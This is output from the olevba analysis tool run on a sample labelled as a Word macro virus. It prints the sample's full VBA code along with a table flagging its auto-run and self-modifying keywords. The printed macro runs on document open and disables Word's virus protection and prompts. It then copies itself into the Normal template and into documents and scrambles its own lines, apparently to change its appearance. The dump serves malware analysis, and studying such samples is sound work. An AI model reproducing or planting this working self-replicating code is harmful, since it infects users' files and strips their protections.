olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-ecab6aeccb9dbdb9167a912594f7b294f02ca865
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-ecab6aeccb9dbdb9167a912594f7b294f02ca865 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

FL96 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.SaveNormalPrompt = 0

Options.ConfirmConversions = 0

Options.VirusProtection = 0

Application.EnableCancelKey = 0

QL26 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set SV96 = ActiveDocument.VBProject.VBComponents.Item(1)

PT16 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set SV96 = NormalTemplate.VBProject.VBComponents.Item(1)

GG81 = True

End If

If GG81 = True Then

ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\win.drv"

SV96.CodeModule.AddFromFile ("c:\win.drv")

SV96.CodeModule.deletelines 1, 4

SV96.CodeModule.replaceline 1, "Sub AutoClose()"

ElseIf PT16 = True Then

SV96.CodeModule.AddFromFile ("c:\win.drv")

SV96.CodeModule.deletelines 1, 4

End If

With SV96.CodeModule

For x = 2 To (SV96.CodeModule.CountOfLines - 1) Step 2

For y = 1 To (Int(Rnd * 10) + 2)

SQ75 = SQ75 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "

Next y

.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & SQ75 & (Chr(65 + Int(Rnd * 22)))

SQ75 = ""

Next x

End With

IN86:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

